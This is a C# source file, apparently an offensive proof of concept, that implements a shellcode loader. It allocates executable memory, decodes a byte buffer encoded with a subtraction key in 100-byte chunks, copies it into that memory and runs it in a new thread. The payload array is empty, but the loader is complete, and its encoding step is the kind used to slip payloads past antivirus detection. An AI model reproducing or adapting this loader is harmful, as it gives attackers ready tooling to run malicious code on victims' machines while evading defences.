using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

// Yes the code is shit, but meh so what - not like I have the whole day to write good pocs
namespace ConsoleApp1 {
	
	class Program{
		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
		static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		[DllImport("kernel32.dll")]
		static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
		
		[DllImport("kernel32.dll")]
		static extern IntPtr GetCurrentProcess();
		
		// Yes the code is shit, but meh so what - not like I have the whole day to write good pocs
		private static int jawohl(byte[] inputz, IntPtr addr, int position, int key)
		{
			int fixSize = 100;
			byte[] slice = new byte[]{};
			byte[] remainder = new byte[0];
			int len = inputz.Length;
			
			if(len > fixSize)
			{
				slice = new byte[fixSize];
				for (int i = 0; i < fixSize; i++)
				{
				    slice[i] = inputz[i];
				}
				
				remainder = new byte[len-fixSize];
				for (int i = 0; i < len-fixSize; i++)
				{
				    remainder[i] = inputz[i+fixSize];
				}
			}else
			{
				slice = new byte[len];
				for (int i = 0; i < len; i++)
				{
				    slice[i] = inputz[i];
				}
			}
			
			// Decode the shellcode
			for (int i = 0; i < slice.Length; i++)
			{
			    slice[i] = (byte)(((uint)slice[i] - key) & 0xFF);
			}
			
			IntPtr ptr;
			if(position == 0)
			{
				ptr = addr;
			}else
			{
				ptr = IntPtr.Add(addr, fixSize);
			}
			Marshal.Copy(slice, 0, ptr, slice.Length);
			
			if(len > fixSize)
			{
				position += fixSize;
				jawohl(remainder, ptr, position, key);
			}
			
			return len;
		}
		
		static void Main(string[] args)
		{
			byte[] buf = new byte[] { /* shellcode */ };
			int key = 666; // key used to encode the shellcode
			
			int size = buf.Length;
			
			IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)size, 0x3000, 0x40);
			
			jawohl(buf, addr, 0, key);
			
			IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
			
			WaitForSingleObject(hThread, 0xFFFFFFFF); // wait for shellcode to finish execution
		}
	}
}
